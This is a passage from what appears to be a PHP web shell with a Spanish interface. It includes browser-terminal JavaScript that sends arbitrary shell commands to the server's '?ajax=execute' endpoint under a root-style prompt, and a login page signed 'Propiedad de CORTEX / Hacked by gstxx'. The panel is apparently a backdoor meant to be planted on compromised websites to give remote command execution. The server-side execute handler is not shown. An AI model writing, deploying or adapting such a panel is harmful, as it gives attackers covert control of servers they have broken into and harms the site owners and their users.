                appendTerminal('Comandos disponibles:\n  clear - Limpiar terminal\n  cd <dir> - Cambiar directorio\n  Cualquier comando de Linux\n\n', '#ff0');
                return;
            }

            // CD command
            if (cmd.startsWith('cd ')) {
                const dir = cmd.substring(3).trim();
                currentDir = dir === '~' ? '/root' : (dir === '..' ? currentDir.split('/').slice(0, -1).join('/') || '/' : dir);
                document.getElementById('terminal-prompt').textContent = `root@<?php echo $system_info['hostname']; ?>:${currentDir}$`;
                appendTerminal('Directorio: ' + currentDir + '\n', '#888');
                return;
            }

            try {
                const fullCmd = `cd ${currentDir} 2>/dev/null; ${cmd}`;
                const res = await fetch('?ajax=execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=' + encodeURIComponent(fullCmd)
                });
                const data = await res.json();
                appendTerminal(data.output || '(sin salida)\n', '#0f0');
            } catch (e) {
                appendTerminal('Error: ' + e.message + '\n', '#f00');
            }
        }

        // Terminal input handler
        document.getElementById('terminal-input').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') {
                executeTerminalCmd(this.value);
                this.value = '';
            } else if (e.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = terminalHistory[historyIndex] || '';
                }
                e.preventDefault();
            } else if (e.key === 'ArrowDown') {
                if (historyIndex < terminalHistory.length - 1) {
                    historyIndex++;
                    this.value = terminalHistory[historyIndex] || '';
                } else {
                    historyIndex = terminalHistory.length;
                    this.value = '';
                }
                e.preventDefault();
            }
        });

        // Close modals on ESC
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') {
                closeTerminal();
                closeCmdModal();
            }
        });

        // Utility
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>

</html>
<?php

// ============================================
// LOGIN FORM - Neon Verde Minimalista
// ============================================
function showLoginForm($config, $login_error = null)
{
    ?>
    <!DOCTYPE html>
    <html lang="es">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Acceso - <?php echo htmlspecialchars($config['title']); ?></title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                background: #000;
                color: #0f0;
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }

            .login-box {
                width: 360px;
                padding: 40px;
                background: #050505;
                border: 1px solid #0f0;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            }

            .login-title {
                text-align: center;
                font-size: 1.5rem;
                margin-bottom: 30px;
                text-shadow: 0 0 10px #0f0;
            }

            .form-group {
                margin-bottom: 20px;
            }

            .form-label {
                display: block;
                margin-bottom: 8px;
                font-size: 0.9rem;
                opacity: 0.8;
            }

            .form-input {
                width: 100%;
                padding: 12px;
                background: #000;
                border: 1px solid #0a0;
                color: #0f0;
                font-family: inherit;
                font-size: 1rem;
                outline: none;
                transition: border-color 0.2s, box-shadow 0.2s;
            }

            .form-input:focus {
                border-color: #0f0;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            }

            .login-btn {
                width: 100%;
                padding: 14px;
                background: transparent;
                border: 1px solid #0f0;
                color: #0f0;
                font-family: inherit;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.2s;
                margin-top: 10px;
            }

            .login-btn:hover {
                background: #0f0;
                color: #000;
                box-shadow: 0 0 15px #0f0;
            }

            .error {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #f00;
                color: #f00;
                padding: 10px;
                margin-bottom: 20px;
                text-align: center;
                font-size: 0.9rem;
            }

            .hint {
                text-align: center;
                margin-top: 25px;
                font-size: 0.8rem;
                opacity: 0.5;
            }

            .scanline {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                height: 2px;
                background: linear-gradient(90deg, transparent, #0f0, transparent);
                animation: scan 3s linear infinite;
                opacity: 0.3;
                pointer-events: none;
            }

            @keyframes scan {
                0% {
                    top: 0;
                }

                100% {
                    top: 100%;
                }
            }
        </style>
    </head>

    <body>
        <div class="scanline"></div>
        <div class="login-box">
            <h1 class="login-title"><?php echo htmlspecialchars($config['title']); ?></h1>

            <?php if ($login_error): ?>
                <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>

            <form method="POST">
                <input type="hidden" name="login" value="1">

                <div class="form-group">
                    <label class="form-label">Usuario</label>
                    <input type="text" name="username" class="form-input" required autofocus>
                </div>

                <div class="form-group">
                    <label class="form-label">Contraseña</label>
                    <input type="password" name="password" class="form-input" required>
                </div>

                <button type="submit" class="login-btn">ACCEDER</button>
            </form>

            <div class="hint">Propiedad de CORTEX / Hacked by gstxx</div>
        </div>
    </body>

    </html>
    <?php
}
?>
